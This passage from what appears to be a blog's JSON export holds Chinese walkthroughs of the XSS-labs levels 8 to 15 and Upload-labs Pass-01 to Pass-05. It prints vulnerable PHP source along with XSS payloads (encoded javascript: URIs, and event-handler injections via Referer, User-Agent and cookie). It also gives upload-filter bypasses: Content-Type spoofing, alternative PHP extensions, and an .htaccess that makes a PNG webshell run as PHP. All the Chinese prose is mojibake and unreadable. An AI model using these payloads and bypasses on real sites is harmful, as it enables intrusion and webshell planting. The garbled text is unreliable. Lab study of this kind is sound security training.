strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; &lt;?php echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';?&gt; å°å†™è½¬æ¢ï¼Œæ•æ„Ÿå­—ç¬¦åŠ _æ›¿æ¢ï¼ŒåŒæ—¶å¯¹&quot;è¿›è¡Œå®ä½“åŒ–æ›¿æ¢ï¼› é€šè¿‡hrefå±æ€§å°†å¤„ç†çš„å€¼è¾“å‡ºï¼› å¯ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œåˆ©ç”¨Javascriptä¼ªåè®®å+å…¶ä»–ç¼–ç  å¦‚æœç”¨æˆ·é€‰æ‹©äº† æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º href å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚ å°†æ•æ„Ÿå­—ç¬¦ä¸­çš„éƒ¨åˆ†å­—æ¯ASCIIè½¬URLç¼–ç ï¼š 12javascri&amp;#x70;t:alert() #HTMLå®ä½“ç¼–ç ï¼ˆHEXï¼‰ javascri&amp;#112;t:alert() #HTMLå®ä½“ç¼–ç ï¼ˆDECï¼‰ ğŸ–ï¼š HTML Entity å­—ç¬¦å®ä½“(å­—ç¬¦è½¬ä¹‰) HTML URL ç¼–ç  ç¬¬9å…³æºç ï¼š 1234567891011121314151617181920212223242526&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?phpif(false===strpos($str7,'http://'))&#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼\"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'; &#125;else&#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';&#125;?&gt; å­—ç¬¦è½¬ä¸ºå°å†™ï¼Œæ•æ„Ÿå­—ç¬¦æ›¿æ¢ï¼› strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ æ³¨é‡Šï¼šstrpos() å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿã€‚ è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚ æ³¨é‡Šï¼šå­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚ é€šè¿‡hrefå±æ€§å°†å¤„ç†çš„å€¼è¾“å‡ºï¼› éœ€è¦ä½¿strpos()å‡½æ•°çš„è¿”å›ç»“æœä¸ä¸ºfalseï¼Œå³åœ¨keywordä¸­éœ€è¦åŒ…å«http://ï¼› å¯é‡‡ç”¨ä»¥ä¸‹ä¸¤ç§æ€è·¯ï¼š 123æ³¨é‡Šï¼šjavascri&amp;#x70;t:alert()//http://javascri&amp;#x70;t:alert()/*http://*/ 12ä½ç½®æ”¾åœ¨å¼¹çª—æç¤ºé‡Œjavascri&amp;#x70;t:alert('http://') ç¬¬10å…³æºç ï¼š 1234567891011121314&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str11 = $_GET[\"t_sort\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; é€šè¿‡GETä¼ å€¼çš„æœ‰ä¸¤ä¸ªå‚æ•°keywordå’Œt_sortï¼Œt_sortå­—ç¬¦ä¸­çš„&lt;&gt;è¢«æ›¿æ¢ä¸ºç©ºï¼› å­˜åœ¨ä¸‰ä¸ªéšè—çš„inputè¾“å…¥æ¡† å¯æ„é€ å¦‚ä¸‹payloadï¼š 1?t_sort=\"type=\"text\" onclick = \"alert(1) ç¬¬11å…³12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_REFERER'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; å…³é”®ï¼š 1234$str11=$_SERVER['HTTP_REFERER'];//è·å–HTTPä¸­refererä¿¡æ¯$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);&lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt; å¯å¯¹refereræ³¨å…¥ï¼› æŠ“åŒ…ï¼ŒRefererå¤„æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š 1Referer: \"onclick=alert(1) type=\"text\" ç¬¬12å…³æºç ï¼š 12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_USER_AGENT'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ua\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; ä¸11å…³ç±»ä¼¼ï¼Œåœ¨user_agentå¤„æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š 1\" onmouseover=alert(1) type=\"text\" ç¬¬13å…³æºç ï¼š 1234567891011121314151617&lt;?php setcookie(\"user\", \"call me maybe?\", time()+3600);ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_COOKIE[\"user\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; ğŸ–ï¼šsetcookie() å‡½æ•° setcookie() å‡½æ•°å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP cookieã€‚ å…³é”®ï¼š 12345setcookie(\"user\", \"call me maybe?\", time()+3600);$str11=$_COOKIE[\"user\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);&lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt; æ‰€ä»¥ç›´æ¥æŠ“åŒ…ä¿®æ”¹cookieä¸­çš„userå€¼å³å¯: 1user=\" onclick=alert(1) type=\"text\" ç¬¬14å…³æºç ï¼š 12345&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"src\"];echo '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;';?&gt; ğŸ–ï¼š ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚ åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚ åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œå¯æ„é€ å¦‚ä¸‹payloadï¼š 1src=level1.php?name=1'window.alert() ç¬¬15å…³123456789&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"&amp;nbsp;\",$str);$str3=str_replace(\" \",\"&amp;nbsp;\",$str2);$str4=str_replace(\"/\",\"&amp;nbsp;\",$str3);$str5=str_replace(\" \",\"&amp;nbsp;\",$str4);echo \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\";?&gt; è€ƒè™‘ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼š 1keyword=&lt;img%0dsrc=1%0donerror=alert()&gt; ç»“æŸï¼ 12345678 ,ad8888ba, 88 88 88 88 d8\"' `\"8b 88 88 88 88 d8' 88 88 88 88 88 ,adPPYba, ,adPPYba, ,adPPYb,88 88 ,adPPYba, 88,dPPYba, 88 88 88888 a8\" \"8a a8\" \"8a a8\" `Y88 88 a8\" \"8a 88P' \"8a 88 Y8, 88 8b d8 8b d8 8b 88 88 8b d8 88 d8 \"\" Y8a. .a88 \"8a, ,a8\" \"8a, ,a8\" \"8a, ,d88 88, ,d88 \"8a, ,a8\" 88b, ,a8\" aa `\"Y88888P\" `\"YbbdP\"' `\"YbbdP\"' `\"8bbdP\"Y8 \"Y8888P\" `\"YbbdP\"' 8Y\"Ybbd8\"' 88","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://singlemindedt.github.io/tags/XSS/"}]},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´","slug":"æ–‡ä»¶åŒ…å«æ¼æ´-1","date":"2020-08-04T01:27:35.000Z","updated":"2020-08-04T01:29:57.191Z","comments":true,"path":"2020/08/04/æ–‡ä»¶åŒ…å«æ¼æ´-1/","link":"","permalink":"https://singlemindedt.github.io/2020/08/04/æ–‡ä»¶åŒ…å«æ¼æ´-1/","excerpt":"","text":"æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ æ€»ç»“","categories":[],"tags":[]},{"title":"Upload-labsè®°å½•","slug":"Upload-labsè®°å½•","date":"2020-08-03T03:42:09.000Z","updated":"2020-08-03T12:48:09.328Z","comments":true,"path":"2020/08/03/Upload-labsè®°å½•/","link":"","permalink":"https://singlemindedt.github.io/2020/08/03/Upload-labsè®°å½•/","excerpt":"","text":"+++ Pass-01 å¦‚å›¾ï¼Œè¦æ±‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ï¼Œå¹¶è¦æ±‚æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡ï¼› é¦–å…ˆï¼Œæˆ‘ä»¬ä¸Šä¼ ä»»æ„æ–‡ä»¶è¯•è¯•ï¼š æç¤ºæˆ‘ä»¬ï¼Œåªèƒ½ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶ï¼› æŸ¥çœ‹æç¤ºï¼Œâ€œæœ¬passåœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ï¼â€ï¼› æç¤ºå·²ç»å¾ˆæ˜ç¡®äº†ï¼Œè¯¥é¢˜ç›®åœ¨å®¢æˆ·ç«¯ä½¿ç”¨jsè¿‡æ»¤ä¸åˆæ³•åç¼€ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šä¼ æ—¶å°†æ–‡ä»¶æ”¹ä¸ºåˆæ³•åç¼€æ ¼å¼ï¼Œç„¶åæŠ“åŒ…ï¼Œå†æ”¹åŒ…ï¼› çœ‹çœ‹æºç ï¼š 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\"); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = \".jpg|.png|.gif\"; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(\".\")); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name; alert(errMsg); return false; &#125;&#125; æ‹¦æˆªæ–¹å¼ï¼šå®¢æˆ·ç«¯jsç™½åå•æ£€æŸ¥;æ ¹æ®ä¸Šä¼ æ–‡ä»¶çš„åç¼€æ˜¯å¦ä¸º.jpg|.png|.gifæ ¼å¼æ¥åˆ¤æ–­æ–‡ä»¶èƒ½å¦ä¸Šä¼ ï¼› ç»•è¿‡æ–¹å¼ï¼šå°†æœ¨é©¬ä¼ªè£…æˆ.jpg|.png|.gifæ–‡ä»¶ï¼Œä¸Šä¼ åburpæ‹¦æˆªæ•°æ®åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åç¼€ä¸º.phpï¼Œå†forward. æ”¹åŒ…ï¼š å…¶ä»–æ–¹æ³•: ä¿®æ”¹jsè„šæœ¬ æµè§ˆå™¨ç¦æ­¢ä½¿ç”¨jsè„šæœ¬ï¼ˆç«ç‹ä¸‹ğŸ¦Š) åœ¨Firefoxåœ°å€æ é‡Œè¾“å…¥â€œabout:configâ€ã€‚åœ¨æœç´¢æ è¾“å…¥â€œjavascript.enabledâ€æŸ¥æ‰¾åˆ°é¦–é€‰é¡¹ã€‚ç‚¹å‡»é¼ æ ‡å³é”®é€‰æ‹©â€œåˆ‡æ¢â€ï¼ŒæŠŠâ€œjavascript.enabledâ€é”®å€¼æ”¹ä¸ºâ€œfalseâ€ +++ Pass-02é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼è¿™æ¬¡ç»™çš„ä¸æ˜¯ç™½åå•æˆ–è€…é»‘åå•ï¼Œè€Œæ˜¯å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œåº”è¯¥ä¸ºMIMEçš„æ£€æŸ¥ã€‚ æŸ¥çœ‹æç¤ºï¼š æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼ è¡¥å……ï¼šMIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ 12345678910111213141516171819å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼šè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/htmlxmlæ–‡æ¡£ .xml text/xmlXHTMLæ–‡æ¡£ .xhtml application/xhtml+xmlæ™®é€šæ–‡æœ¬ .txt text/plainRTFæ–‡æœ¬ .rtf application/rtfPDFæ–‡æ¡£ .pdf application/pdfMicrosoft Wordæ–‡ä»¶ .word application/mswordPNGå›¾åƒ .png image/pngGIFå›¾å½¢ .gif image/gifJPEGå›¾å½¢ .jpeg,.jpg image/jpegauå£°éŸ³æ–‡ä»¶ .au audio/basicMIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midiRealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudioMPEGæ–‡ä»¶ .mpg,.mpeg video/mpegAVIæ–‡ä»¶ .avi video/x-msvideoGZIPæ–‡ä»¶ .gz application/x-gzipTARæ–‡ä»¶ .tar application/x-tarä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream +++ æºç ï¼š 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯ç™½åå•;å¯¹æ–‡ä»¶çš„MIME(Multipurpose Internet Mail Extensions)è¿›è¡Œäº†éªŒè¯ï¼Œåªå…è®¸å›¾ç‰‡ç±»æ–‡ä»¶ä¸Šä¼ é€šè¿‡ ç»•è¿‡æ–¹å¼ï¼š ç›´æ¥ä¸Šä¼ å«æœ¨é©¬çš„å›¾ç‰‡æ–‡ä»¶ï¼ŒburpæˆªåŒ…ï¼Œä¿®æ”¹åç¼€ä¸ºphpæ–‡ä»¶ ç›´æ¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼ŒburpæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typeä¸ºimage/pngç­‰å…è®¸ç±»å‹ +++ æ­¤å¤„æˆ‘ä»¬åˆ©ç”¨2ä¿®æ”¹Content-Typeä¸ºimage/pngï¼šæŠ“åŒ…ï¼š[4]:() æ”¹åŒ…ï¼š[5]:() å‘åŒ…ï¼šæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç›´æ¥å°†æ–‡ä»¶æ‹–å‡ºæ¥å³å¯å¾—è®¿é—®ï¼› +++ Psaa-03é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼ æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼ æºç ï¼š 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•éªŒè¯;(ç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶) ç»•è¿‡æ–¹å¼ï¼š(1)å¯ä¸Šä¼ .php3.phtml .phps .php5 .phtâ€¦ç­‰è¿™æ ·å¯ä»¥è¢«æœåŠ¡å™¨è§£æçš„åç¼€å(2)é‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ªhack.pngæ–‡ä»¶(å«æœ¨é©¬)é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€hack.pngâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œæ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ.htaccessæ–‡ä»¶å†…å®¹ï¼š 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; application/x-httpd-phpç§°MIMEç±»å‹ æ­¤å¤„ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º.php3; ä¸Šä¼ æˆåŠŸï¼+++ Pass-04é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ! æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼ æºç ï¼š 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•åŠ å¼ºéªŒè¯;ä¸Pass-03ç±»ä¼¼ï¼Œåªæ˜¯å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åçš„é™åˆ¶ç§ç±»å¢åŠ  ç»•è¿‡æ–¹å¼ï¼šé‡å†™æ–‡ä»¶è§£æè§„åˆ™ç»•è¿‡(ç¬¬3å…³(2)) ä¸Šä¼ .htaccessæ–‡ä»¶ 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; ä¸Šä¼ hack.pngï¼ˆå«æœ¨é©¬ï¼‰ ä¸Šä¼ æˆåŠŸï¼Œå¹¶ä»¥phpè¿›è¡Œäº†è§£æï¼ +++ Pass-05é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼ * æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ 